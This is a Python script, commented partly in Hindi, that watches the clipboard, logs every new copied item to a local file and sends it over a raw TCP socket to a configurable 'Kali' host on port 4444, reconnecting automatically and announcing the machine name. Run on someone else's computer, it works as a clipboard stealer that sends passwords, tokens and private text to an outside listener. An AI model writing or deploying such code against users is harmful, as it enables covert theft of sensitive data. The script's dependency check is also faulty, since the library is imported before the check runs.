#!/usr/bin/env python3
# File name: Sender.py (Simple version without colorama)
# One-click Clipboard to Kali Linux

import pyperclip
import time
import socket
import threading
import os
import sys
from datetime import datetime

# ===== CONFIGURATION =====
KALI_IP = "your IP"  # Apni Kali ki IP yahan daalo
KALI_PORT = 4444
# =========================

class ClipboardToKali:
    def __init__(self):
        self.last_text = ""
        self.running = True
        self.connected = False
        self.socket = None
        
    def connect_to_kali(self):
        """Kali se connection banaye"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)
            self.socket.connect((KALI_IP, KALI_PORT))
            self.connected = True
            self.send_message(f"[+] Clipboard monitor started from {os.environ.get('COMPUTERNAME', 'Unknown')}")
            return True
        except:
            self.connected = False
            return False
    
    def send_message(self, message):
        """Kali ko message bheje"""
        if self.connected and self.socket:
            try:
                self.socket.send(f"{message}\n".encode('utf-8'))
                return True
            except:
                self.connected = False
                return False
        return False
    
    def monitor_clipboard(self):
        """Clipboard monitor kare"""
        print("\n[*] Clipboard Monitor Started")
        print(f"[*] Target Kali: {KALI_IP}:{KALI_PORT}")
        print("[*] Copy anything (Ctrl+C) to send to Kali")
        print("[*] Press Ctrl+C to stop\n")
        
        # Local file bhi save karega
        log_file = f"clipboard_{datetime.now().strftime('%Y%m%d')}.txt"
        
        # Kali se connect karne ki koshish
        connection_thread = threading.Thread(target=self.auto_reconnect)
        connection_thread.daemon = True
        connection_thread.start()
        
        try:
            while self.running:
                try:
                    current = pyperclip.paste()
                    
                    if current and current != self.last_text:
                        time_now = datetime.now().strftime("%H:%M:%S")
                        
                        # Local save
                        with open(log_file, 'a', encoding='utf-8') as f:
                            f.write(f"[{time_now}] {current}\n")
                        
                        # Kali ko bhejo
                        if self.connected:
                            self.send_message(f"[{time_now}] {current}")
                            status = "[SENT]"
                        else:
                            status = "[SAVED LOCALLY]"
                        
                        # Preview show karo
                        preview = current[:50] + "..." if len(current) > 50 else current
                        print(f"[{time_now}] {status}: {preview}")
                        
                        self.last_text = current
                    
                except Exception as e:
                    pass  # Clipboard read error ignore karo
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            self.stop()
    
    def auto_reconnect(self):
        """Auto-reconnect to Kali"""
        while self.running:
            if not self.connected:
                print("[!] Connecting to Kali...")
                if self.connect_to_kali():
                    print("[✓] Connected to Kali!")
                else:
                    print("[!] Connection failed, retrying...")
            time.sleep(5)  # Har 5 sec mein retry kare
    
    def stop(self):
        """Cleanup"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        print("\n[!] Monitor stopped")

def main():
    # Pehle check karo ki pyperclip install hai ya nahi
    try:
        import pyperclip
    except ImportError:
        print("[!] Pyperclip not installed!")
        print("[*] Installing pyperclip...")
        os.system("pip install pyperclip")
        print("[✓] Installed! Run again.")
        input("Press Enter to exit...")
        sys.exit(0)
    
    # Monitor start karo
    monitor = ClipboardToKali()
    monitor.monitor_clipboard()

if __name__ == "__main__":
    main()
